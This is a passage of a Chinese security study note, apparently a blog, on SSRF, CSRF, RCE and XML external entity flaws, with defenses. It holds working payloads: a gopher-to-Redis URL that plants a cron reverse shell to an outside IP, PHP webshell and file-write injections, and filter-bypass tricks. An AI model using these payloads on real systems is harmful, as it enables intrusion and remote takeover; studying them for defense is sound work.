+<h4 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h4><h5 id="漏洞验证方式"><a href="#漏洞验证方式" class="headerlink" title="漏洞验证方式"></a>漏洞验证方式</h5><ul>
+<li>排除法：浏览器f12查看源代码看是否是在本地进行了请求</li>
+<li>使用dnslog等工具进行测试，看是否被访问(可以再盲打后台，比如将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</li>
+<li>抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址：</li>
+</ul>
+<blockquote>
+<p>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p>
+<p>通过二级域名暴力猜解工具模糊猜测内网地址</p>
+<p>通过file协议读取内网信息获取相关地址</p>
+</blockquote>
+<ul>
+<li>留意bool型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法</li>
+<li>直接返回Banner、title、content等信息</li>
+</ul>
+<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
+<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
+<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
+<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
+<p>5.利用file协议读取本地文件等;</p>
+<p>6.各个协议调用探针：http,file,dict,ftp,gopher等;</p>
+<blockquote>
+<p>http:192.168.64.144/phpmyadmin/<br>file:///D:/<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict://192.168.64.144:3306/info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p>
+</blockquote>
+<p>7、本地利用和远程利用</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/258449.html">ssrf知识点总结</a></p>
+<h4 id="4、绕过方式"><a href="#4、绕过方式" class="headerlink" title="4、绕过方式"></a>4、绕过方式</h4><h5 id="绕过（http基本身份认证绕过）"><a href="#绕过（http基本身份认证绕过）" class="headerlink" title="@绕过（http基本身份认证绕过）"></a>@绕过（http基本身份认证绕过）</h5><p>使用前提：目标网站对访问的域名进行限制，且其本身存在ssrf漏洞时。</p>
+<blockquote>
+<p>url的完整格式为：</p>
+<p>协议类型://访问资源需要的凭证信息@服务器地址:端口号/资源层级UNIX文件路径（精确到文件名）?查询#片段ID</p>
+</blockquote>
+<p>因此！</p>
+<blockquote>
+<p>访问<code>&lt;a href=&quot;http://baidu.com@1.1.1.1&quot;&gt;</code>、<code>http://baidu.com@1.1.1.1</code></p>
+<p>与</p>
+<p>访问<code>http://1.1.1.1</code></p>
+<p>其得到的效果是一样的。因为解析的本就是@后的服务器地址。</p>
+<p>意思就是！比如，ssrf只允许访问百度：</p>
+<p><code>http://127.0.0.1/ssrf.php?url=https://www.baidu.com</code></p>
+<p>我们的目标是绕过百度访问搜狗，可以使用@绕过：</p>
+<p><code>http://127.0.0.1/ssrf.php?url=https://www.baidu.com@www.sogou.com</code></p>
+<p>注意：在对@解析域名中，不同的处理函数存在处理差异，比如在PHP的parse_url()中会识别<code>www.sogou.com</code>，而libcurl()则识别为<code>www.baidu.com</code>。</p>
+</blockquote>
+<h5 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h5><blockquote>
+<p>顾名思义，就是使用<code>进制转换</code>来进行绕过嘛！将一些关键数字参数使用<code>二进制</code>、<code>八进制</code>、<code>十六进制</code>、<code>十进制整数格式</code>进行转换。</p>
+<p>比如，IP地址 192.168.0.1 可以被改写为：</p>
+<p>八进制格式：0300.0250.0.1</p>
+<p>十六进制格式：0xC0.0xA8.0.1</p>
+<p>十进制整数格式：3232235521（第一次听说这个哈哈哈）</p>
+</blockquote>
+<ul>
+<li>————————————————————————</li>
+</ul>
+<p>IP地址的十进制整数格式计算方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721391030526.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721390879675.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>————————————————————————</li>
+</ul>
+<h5 id="用句号-。-替换"><a href="#用句号-。-替换" class="headerlink" title="用句号"。"替换 ".""></a>用句号"。"替换 "."</h5><blockquote>
+<p>将IP地址中各个分隔部分的“.”号均分别使用“。”替代：</p>
+<p>例：192.168.204.128 ----> 192。168。204.128</p>
+<p>但是执行过程中，右边的表达也会被解析为左边的表达。</p>
+</blockquote>
+<h5 id="xip-io-和-xip-name-绕过"><a href="#xip-io-和-xip-name-绕过" class="headerlink" title="xip.io 和 xip.name 绕过"></a>xip.io 和 xip.name 绕过</h5><p>使用前提：服务端没有先解析IP再过滤内网地址，就可以使用localhost等解析到内网的域名。（ xip.name在使用上与xip.io一致）</p>
+<p>此外，如果php后端只使用parse_url函数中的host参数判断是否等于127.0.0.1，那么就可以使用<code>xip.io</code>、<code>nip.io</code>、<code>sslip.io</code>这些特殊网址进行绕过。</p>
+<blockquote>
+<p><code>xip.io</code>可以指向任意域名。所以可以将其与内网IP/域名进行绑定，使其解析到内网。</p>
+<p>例；<code>http://127.0.0.1.xip.io/1.php</code>实际上会解析到<code>http://127.0.0.1/1.php</code></p>
+</blockquote>
+<h5 id="添加端口号"><a href="#添加端口号" class="headerlink" title="添加端口号"></a>添加端口号</h5><p>有些网站可能会限制子网段。因此可以在URL中目标IP地址后面使用冒号“:”添加服务端口号，常用的是，添加<code>：80</code>端口绕过。</p>
+<h5 id="利用-绕过"><a href="#利用-绕过" class="headerlink" title="利用[::]绕过"></a>利用[::]绕过</h5><p>利用<code>[::]</code>来实现绕过。<code>http://[::]:80/</code>会解析为<code>http://127.0.0.1</code></p>
+<h5 id="DNS-重绑（Rebinding）"><a href="#DNS-重绑（Rebinding）" class="headerlink" title="DNS 重绑（Rebinding）"></a>DNS 重绑（Rebinding）</h5><p>工具网站：<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36348899/article/details/119297854">[DNS安全] 详解DNS重绑定攻击</a></p>
+<blockquote>
+<p>重绑逻辑：</p>
+<p>1、判定你给的 IP 或者域名解析后的 IP 是否在黑名单中</p>
+<p>2、若在，退出报错</p>
+<p>3、若不在，再次访问你给的 IP 或者域名解析后的 IP；执行后续业务模块</p>
+<p>实现效果：</p>
+<p>拥有一个域名，其映射到两个IP。同时设置 TTL 为 0，方便两个 IP 切换。</p>
+<p>效果类比：你访问wwfcww.xyz这个域名，第一次解析的 IP 是 192.168.0.1；而第二次解析的IP是 127.0.0.1，如此一来即可进行 SSRF 攻击。</p>
+</blockquote>
+<h5 id="非HTTP协议绕过"><a href="#非HTTP协议绕过" class="headerlink" title="非HTTP协议绕过"></a>非HTTP协议绕过</h5><p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。比如通过<code>gopher</code>，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。</p>
+<p> 例，使用gopher协议对与内网的Redis服务进行攻击，可使用如下url：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gopher://127.0.0.1:6379/_*1%0d%0a<span class="hljs-variable">$8</span>%0d%0aflushall%0d%0a*3%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$1</span>%0d%0a1%0d%0a<span class="hljs-variable">$64</span>%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a<span class="hljs-variable">$6</span>%0d%0aconfig%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$3</span>%0d%0adir%0d%0a<span class="hljs-variable">$16</span>%0d%0a/var/spool/cron/%0d%0a*4%0d%0a<span class="hljs-variable">$6</span>%0d%0aconfig%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$10</span>%0d%0adbfilename%0d%0a<span class="hljs-variable">$4</span>%0d%0aroot%0d%0a*1%0d%0a<span class="hljs-variable">$4</span>%0d%0asave%0d%0aquit%0d%0a<br></code></pre></td></tr></table></figure>
+
+<p>前面讲漏洞利用的时候提到过协议渗透。请回去复习。</p>
+<h4 id="5、漏洞防御"><a href="#5、漏洞防御" class="headerlink" title="5、漏洞防御"></a>5、漏洞防御</h4><blockquote>
+<p>1、在内网设备上建立黑名单内网IP，禁止公开服务器的访问。</p>
+<p>2、过滤返回信息，对响应用户请求的返回信息进行验证。</p>
+<p>3、禁用端口banner信息。</p>
+<p>4、禁用不必要的协议，防止file协议等。</p>
+<p>5、根据业务需求设定URL格式。防止攻击者构建攻击语句6、统一错误信息，避免攻击者根据错误信息判断端口状态7、限制请求端口。</p>
+</blockquote>
+<h3 id="④CSRF跨站请求伪造"><a href="#④CSRF跨站请求伪造" class="headerlink" title="④CSRF跨站请求伪造"></a>④CSRF跨站请求伪造</h3><h4 id="1、漏洞简介-2"><a href="#1、漏洞简介-2" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h4><p>· csrf（xsrf），跨站请求伪造，也被称为one-click attack 或 session riding。是一种<code>挟持用户在当前已登录的web应用程序上执行非本意操作</code>的攻击方法。</p>
+<p>· <strong>原理</strong>：黑客利用已登陆的用户，<code>诱使其访问或登陆某个早已构造好的恶意链接或页面</code>，然后在<code>用户毫不知情</code>的情况下，<code>以用户的名义完成了非用户本意的非法操作</code>。</p>
+<p>· <strong>实现的效果</strong>：csrf跨站请求伪造的实现效果，可以理解为攻击者盗用了合法用户的身份，以其名义在恶意网站发送恶意请求，合法用户发起的恶意请求对服务器来说是合法的。</p>
+<p>· <strong>与XSS跨站脚本攻击相比</strong>：</p>
+<blockquote>
+<p>XSS利用的是用户对指定网站的信任（攻击者预先将恶意代码插入网站网页中）</p>
+<p>CSRF利用的是网站对用户网页浏览器的信任。（攻击者诱使用户点击恶意链接或页面进而向服务器发送恶意请求）</p>
+<p>注意！</p>
+<p>CSRF攻击中，攻击者并没有拿到用户的权限。是借用户的权限完成了攻击（“借刀杀人”）</p>
+<p>而XSS攻击中，攻击者可以通过盗取cookie来获取用户权限进而完成破坏。（“侵占”）</p>
+</blockquote>
+<p>· <strong>攻击细节</strong>：</p>
+<p>csrf（跨站请求攻击）简单来说，就是攻击者通过一些技术手段<code>欺骗</code>用户的浏览器去访问一个用户<code>曾经认证过的网站</code>并运行一些操作（如发邮件、发信息、财产操作如转账或购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。</p>
+<p>攻击过程中利用了web中用户身份验证的漏洞：<code>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的</code>。</p>
+<p>典型示例：tom登陆了银行网站且没有退出，此时浏览器中包含着tom在银行的身份验证信息 ----  攻击者将伪造的转账请求包含在帖子中，并发送给tom ----  tom在银行网站保持登陆的情况下浏览帖子 ----  即会将伪造的转账请求连同身份的认证信息发送到银行网站 ----  银行网站看到身份认证信息，认为请求是tom的合法操作。</p>
+<p>· <strong>原理总结</strong>：</p>
+<blockquote>
+<p>一个CSRF漏洞攻击的实现，其需要由‘几个部分’来构成：</p>
+<p>1、首先，需要有一个漏洞存在（无需验证、任意修改后台数据、新增请求）</p>
+<p>2、伪装数据操作请求的恶意链接或页面</p>
+<p>3、诱使用户主动访问或登陆恶意链接，触发非法操作</p>
+</blockquote>
+<h4 id="2、漏洞检测"><a href="#2、漏洞检测" class="headerlink" title="2、漏洞检测"></a>2、漏洞检测</h4><ul>
+<li><p>方法一：抓取一个正常请求的数据包，去掉referer字段后再重新提交，如果该提交还是有效的，那么基本上可以确认目标网站存在csrf漏洞。</p>
+</li>
+<li><p>方法二：使用专门针对csrf漏洞检测的工具进行检测，如CSRFTester，CSRF Request Builder 等。</p>
+</li>
+</ul>
+<blockquote>
+<p>CSRFTester漏洞检测工具的测试原理：首先需要抓取我们在浏览器中访问过的所有链接以及所有表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这部操作相当于伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞。</p>
+<p>（所以这些检测工具也可以被用来执行CSRF攻击！）</p>
+</blockquote>
+<h4 id="3、漏洞利用-1"><a href="#3、漏洞利用-1" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wudideaqing/article/details/139678044">CSRF(跨站请求伪造)漏洞 (带靶场演示+漏洞挖掘）</a></p>
+<h5 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h5><p>有以下五种：</p>
+<blockquote>
+<ul>
+<li>链接点击：</li>
+</ul>
+<p>攻击者通过邮件、社交媒体或其它方式发送包含恶意请求的链接，并诱导用户点击。</p>
+<ul>
+<li>隐藏表单</li>
+</ul>
+<p>在恶意网站上嵌入隐藏的表单，诱导用户在不知情的情况下触发表单提交。</p>
+<ul>
+<li>自动提交表单</li>
+</ul>
+<p>在恶意网站上使用javascript自动提交包含恶意请求的表单。如，编写响应功能的POC。</p>
+<ul>
+<li>图像加载</li>
+</ul>
+<p>在恶意网站嵌入图像标签，图像URL指向目标网站的恶意请求。</p>
+<ul>
+<li>跨域请求</li>
+</ul>
+<p>利用XMLHttpRequest或Fetch API发送跨域请求。（但是这通常会被浏览器中的同源策略和CORS限制）</p>
+<p>CORS：跨源资源共享机制。用于定义在一个域中加载的客户端web应用程序与另一个域中的资源交互方式。</p>
+</blockquote>
+<h4 id="4、漏洞防御"><a href="#4、漏洞防御" class="headerlink" title="4、漏洞防御"></a>4、漏洞防御</h4><ul>
+<li><strong>检查Referer字段</strong></li>
+</ul>
+<p>在HTTP协议头中有一个字段叫做Referer，它记录了该HTTP请求的来源地址。在处理敏感数据请求时，Referer字段（<code>不会骗人的真实请求地址</code>）应该要和请求的地址（<code>对方声称的请求地址</code>）处于同一个域名下。</p>
+<p>但是该由于Referer的值是由浏览器提供的，每个浏览器对于Referer字段的具体实现存在差别，因此，并不能保证浏览器自身并没有安全漏洞。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/SongSir001/article/details/98182051">CSRF（跨站请求伪造） 漏洞与预防-有预防代码实现</a></p>
+<ul>
+<li><strong>在请求地址中添加token并验证</strong></li>
+</ul>
+<p>CSRF攻击成功的原因是：因为攻击者能够<code>伪造用户的请求</code>，且该请求中所有的用户验证信息<code>都存在于cookie</code>中，因此攻击者可以在无需知道用户验证信息的情况下直接利用用户自己的cookie来通过安全验证。</p>
+<p>所以！抵御CSRF攻击的关键在于：<code>在请求中放入一些攻击者不能伪造的信息，并且该信息不存在于cookie当中</code>。</p>
+<p>所以，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在该服务器上建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。（这个防御手法一般是开发人员做）</p>
+<ul>
+<li><strong>当前用户密码验证</strong></li>
+</ul>
+<p>在修改关键信息时，要求当前用户输入其自身的密码，以验证当前用户身份的真伪，进而防止未授权的恶意操作。</p>
+<ul>
+<li><strong>SameSite Cookie 属性</strong></li>
+</ul>
+<p>设置 Cookie 的 SameSite 属性为 Strict 或 Lax，防止跨站请求携带 Cookie。</p>
+<ul>
+<li><strong>定期重置 Session ID</strong></li>
+</ul>
+<p>降低会话被劫持的风险，确保会话令牌的安全性。</p>
+<h3 id="⑤RCE远程代码执行漏洞"><a href="#⑤RCE远程代码执行漏洞" class="headerlink" title="⑤RCE远程代码执行漏洞"></a>⑤RCE远程代码执行漏洞</h3><h4 id="1、漏洞简介-3"><a href="#1、漏洞简介-3" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h4><p>RCE，远程命令执行/远程代码执行。指用户通过<code>浏览器</code>提交执行操作命令，由于服务器端没有针对执行函数做过滤，就执行了恶意命令/代码。</p>
+<ul>
+<li><strong>出现：</strong>应用程序<code>直接/间接</code>使用了动态执行命令/代码的危险函数，并且函数的运行参数是<code>用户可控</code>的。</li>
+</ul>
+<p><strong>·</strong> 远程命令执行，一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如常见的<code>路由器</code>、<code>防火墙</code>、<code>入侵检测等设备</code>的web管理页面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后后台会对该IP地址进行一次ping测试，并返回测试结果。如果设计者对该功能没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令。</p>
+<p><strong>·</strong> 远程代码执行，亦是同样的道理，后台有时候会把用户的输入 作为代码的一部分进行执行。</p>
+<ul>
+<li><strong>原理：</strong>当用户控制命令/代码执行函数中的参数时，注入恶意系统命令到正常命令中，造成命令/代码执行攻击。</li>
+</ul>
+<p><strong>·</strong> RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或代码，从而控制后台系统。</p>
+<ul>
+<li><p><strong>本质：</strong>程序设计违背了<code>数据与代码分离</code>的原则。</p>
+</li>
+<li><p><strong>远程命令执行和远程代码执行的区别：</strong></p>
+</li>
+</ul>
+<blockquote>
+<p>远程命令执行：一般指操作系统命令</p>
+<p>远程代码执行：一般指的是脚本代码</p>
+</blockquote>
+<h4 id="2、命令拼接符"><a href="#2、命令拼接符" class="headerlink" title="2、命令拼接符"></a>2、命令拼接符</h4><h5 id="windows系统"><a href="#windows系统" class="headerlink" title="windows系统"></a>windows系统</h5><blockquote>
+<p><code>|</code>：管道符，前面命令的输出作为后面命令的输入。如 help | more，前面help命令会输出help的所有用法选项，这些选项输入给more，进行分页展示。</p>
+<p><code>&amp;</code>：commandA & commandB，运行命令A，然后再运行命令B。</p>
+<p><code>||</code>：commandA || commandB，运行命令A，如果失败则运行命令B，如果成功也不再需要运行命令B了。</p>
+<p><code>&amp;&amp;</code>：commandA && commandB，运行命令A，如果成功则运行命令B，言外之意就是运行A失败后不再运行后面的命令。</p>
+</blockquote>
+<h5 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h5><p>windows系统下的命令拼接符均使用于Linux下，此外，Linux还有：</p>
+<blockquote>
+<p><code>;</code>前后命令都执行，执行A后又执行B，或更多条命令。</p>
+</blockquote>
+<h4 id="3、执行函数"><a href="#3、执行函数" class="headerlink" title="3、执行函数"></a>3、执行函数</h4><h5 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a>系统命令执行函数</h5><blockquote>
+<ul>
+<li><p><code>system()</code>: 执行一个外部的应用程序，并显示输出的结果</p>
+</li>
+<li><p><code>passthru()</code>: 执行一个UNIX系统命令并显示原始的输出</p>
+</li>
+<li><p><code>exec()</code>: 执行一个外部的应用程序，只返回最后一行的结果</p>
+</li>
+<li><p><code>shell_exec()</code>: 执行<code>shell</code>命令并返回 输出的结果的字符串</p>
+</li>
+</ul>
+<p>popen()：用于创建一个管道，通过该管道可以执行一个shell命令并获取其输出。执行示例<code>fp = popen(&quot;ls -l&quot;, &quot;r&quot;);</code></p>
+<p>proc_open(): 用于创建一个新进程，并提供更灵活的控制和通信方式，比如可以指定输入输出流。</p>
+<p>pcntl_exec(): 用于在当前进程中执行一个新的程序，替换当前进程的内容。</p>
+</blockquote>
+<p>常使用的是前面四个！</p>
+<h5 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h5><blockquote>
+<ul>
+<li><p><code>eval()</code>：传入的参数必须是php代码，即需要以分号结尾。例如：<code>cmd=system(whoami)；</code></p>
+</li>
+<li><p><code>assert()</code>：直接将传入的参数当成php代码执行，传入的参数不需要以分号结尾。例如：<code>cmd=system(whoami)</code></p>
+</li>
+<li><p><code>preg_replace()</code>：将目标字符中<code>符合正则规则</code>（自己拟定的）的字符替换为替换字符，此时，如果正则规则中使用<code>/e</code>修饰符，则表示存在代码执行漏洞。例如：<code>preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);</code>表示函数将根据正则表达式模式（参数一），在参数三中寻找到了与模式匹配的字符串并将其替换为参数二提供的字符串。</p>
+</li>
+</ul>
+<p>有关<code>/e</code>修饰符的解释如下：</p>
+<p>也就是说，在执行替换的过程中，替换字符串会被当成代码解释执行</p>
+<p>但受版本限制，仅适用于PHP版本&lt;5.5.0</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721808910747.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li><p><code>create_function()</code>：创造匿名函数执行代码，执行命令和上传文件参考eval()函数（必须加分号）。例如：<code>$func=create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);$func();</code>其中，参数一表示函数的参数列表，参数二表示函数体的代码。创建完毕后执行该匿名函数。（$表示变量声明）</p>
+</li>
+<li><p><code>call_user_func()</code>：调用一个回调函数处理字符串。例如：<code>call_user_func(&quot;assert&quot;,$_POST[&#39;cmd&#39;])；</code>其中，参数一是被调用的回调函数，可以是包含函数名的字符串或包含对象引用和方法名的数组。参数二是传递给回调函数的参数，可以有多个，之间使用逗号分隔。</p>
+</li>
+<li><p><code>array_filter()</code>：用回调函数过滤数组中的元素。</p>
+</li>
+</ul>
+</blockquote>
+<h4 id="4、漏洞检测"><a href="#4、漏洞检测" class="headerlink" title="4、漏洞检测"></a>4、漏洞检测</h4><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><blockquote>
+<p>白盒：对代码进行审计</p>
+<p>黑盒：利用漏扫工具、公开的漏洞、手工看功能点及参数值。</p>
+</blockquote>
+<h5 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h5><p>整体的检测方式和<strong>命令执行</strong>的是一样的，只是输入的方式不同。</p>
+<h4 id="5、漏洞利用"><a href="#5、漏洞利用" class="headerlink" title="5、漏洞利用"></a>5、漏洞利用</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/367358.html">RCE代码及命令执行</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/395449.html">rce漏洞介绍及其绕过教程</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73185293/article/details/131557169">RCE漏洞详解及绕过总结(全面)-很多绕过示例</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41315957/article/details/118855865">总结rce（远程代码执行各种sao姿势）绕过bypass</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46706771/article/details/118893434">RCE(远程代码执行漏洞)原理及漏洞利用</a></p>
+<h5 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="RCE绕过"></a>RCE绕过</h5><blockquote>
+<ul>
+<li><strong>空格绕过</strong>：使用<code>$&#123;IFS&#125;</code>、<code>$IFS</code>、<code>+</code>、<code>%09</code>、<code>%0b</code>、<code>$IFS$9</code>、<code>$IFS$1</code>、重定向符<code>&lt;</code>或<code>&lt;&lt;</code>中的一种符合替代空格。例如：cat file -- cat>file</li>
+<li><strong>字符绕过</strong>：</li>
+</ul>
+<p>用 \ 绕过：例如 cat -> c\at</p>
+<p>用 ` 绕过：例如 cat -> 使用两个单引号将 cat 包围封闭起来</p>
+<p>用 '' 绕过：例如 cat -> c''at</p>
+<p>用 $ 绕过(字符拼接法)：例如：flag -> a=f;$alag（如果过滤了<code>;</code>字符串,可以用<code>%0a,%0d,%0D%0A</code>来代替）</p>
+<p>用base编码绕过</p>
+<p>......还有更多的绕过方法参考上述链接1、2、3、4</p>
+</blockquote>
+<h5 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 注入一句话木马<br>?txt=@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);    <br>// 获取当前绝对路径<br>?txt=<span class="hljs-built_in">print</span>(_FILE_);      <br>// 读取重要文件<br>?txt=var_dump(file_get_contents(<span class="hljs-string">&#x27;c:\\windows\system32\drivers\etc\hosts&#x27;</span>));    <br>// 写入shell，Getshell<br>?txt=var_dump(file_put_contents(<span class="hljs-variable">$_POST</span>[1],<span class="hljs-variable">$POST</span>[2]));<br>1=shell.php&amp;2=&lt;?php phpinfo()?&gt;   <br></code></pre></td></tr></table></figure>
+
+<h4 id="6、漏洞危害"><a href="#6、漏洞危害" class="headerlink" title="6、漏洞危害"></a>6、漏洞危害</h4><ul>
+<li>任意命令执行系统命令</li>
+<li>恶意木马被种植</li>
+<li>挂马、钓鱼</li>
+<li>敏感信息泄露</li>
+<li>继承web服务器权限，读写重要文件</li>
+<li>反弹shell</li>
+<li>继承web服务器程序权限，去执行系统命令</li>
+</ul>
+<h4 id="7、漏洞防御"><a href="#7、漏洞防御" class="headerlink" title="7、漏洞防御"></a>7、漏洞防御</h4><p>1、过滤特殊字符或替换字符</p>
+<p>2、严格验证输入的类型长度</p>
+<p>3、使用escapeshellarg()函数处理相关参数</p>
+<p>4、尽量使用自定义函数或函数库实现外部应用程序或命令的功能。在执行system、eval等命令执行功能的函数前，要先确定参数内容。</p>
+<p>5、尽量避免使用容易产生漏洞的危险函数</p>
+<p>6、对用户的输入做严格的过滤，如白名单过滤</p>
+<h3 id="⑥XML外部实体注入攻击（XEE）"><a href="#⑥XML外部实体注入攻击（XEE）" class="headerlink" title="⑥XML外部实体注入攻击（XEE）"></a>⑥XML外部实体注入攻击（XEE）</h3><h4 id="1、先验知识-1"><a href="#1、先验知识-1" class="headerlink" title="1、先验知识"></a>1、先验知识</h4><ul>
+<li><h5 id="XML基础简介"><a href="#XML基础简介" class="headerlink" title="XML基础简介"></a>XML基础简介</h5></li>
+</ul>
+<p><code>xml</code>，指可扩展标记语言，是一种很像HTML的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。被设计用来<code>传输和存储数据</code>。</p>
+<p><code>html</code>用于<code>显示数据</code>。</p>
+<ul>
+<li><h5 id="XML文档格式"><a href="#XML文档格式" class="headerlink" title="XML文档格式"></a>XML文档格式</h5></li>
+</ul>
+<p>xml文档格式包含了xml声明、DTD文档类型定义（可选，即XML的布局语言）、文档元素。</p>
+<p>其中：</p>
+<p>· xml声明：是用于XML文档开头的一个语句，用于指定关于文档本身的信息，并非所有XML文档都必须使用。其声明通常为：<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></p>
+<p>· DTD文档类型定义：它的作用是定义 XML 文档的合法构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
+<blockquote>
+<ul>
+<li>DTD声明</li>
+</ul>
+<p>内部声明DTD：<!DOCTYPE 根元素 [元素声明]></p>
+<p>引用外部DTD文档：</p>
+<p>~ 当引用的DTD文件是本地文件的时候，用<code>SYSTEM</code>标识。<!DOCTYPE 根元素 SYSTEM "DTD文件路径"></p>
+<p>~ 当引用的DTD文件是一个公共文件的时候，用<code>PUBLIC</code>标识。<!DOCTYPE 根元素 PUBLIC "DTD名称" "DTD文件的URL"></p>
+<ul>
+<li>DTD实体（ENTITY）</li>
+</ul>
+<p>是用于定义引用普通文本或特殊字符的快捷方式的变量（标签中的内容）。共有四种实体声明：</p>
+<p>内部实体声明：<!ENTITY 实体名称 "实体的值"></p>
+<p>外部实体声明：<!ENTITY 实体名称 SYSTEM "URI"></p>
+<p>参数实体声明：<!ENTITY % 实体名称 "实体的值">、<!ENTITY % 实体名称 SYSTEM "URI/URL"></p>
+<p>公共实体声明：<!ENTITY 实体名称 PUBLIC "public_ID" "URL"></p>
+<p>调用方式：<code>&amp;实体名称;</code>（注意，参数实体只能被DTD文件自身调用，当然也可以外部引用）</p>
+</blockquote>
+<ul>
+<li><h5 id="XML树结构"><a href="#XML树结构" class="headerlink" title="XML树结构"></a>XML树结构</h5></li>
+</ul>
+<p>XML 文档形成了一种树结构，它从"根部"开始，然后扩展到"枝叶"</p>
+<ul>
+<li><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!--XML声明--&gt;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br><br>&lt;!--文档类型定义--&gt;<br>&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt; <br>    &lt;!ELEMENT note 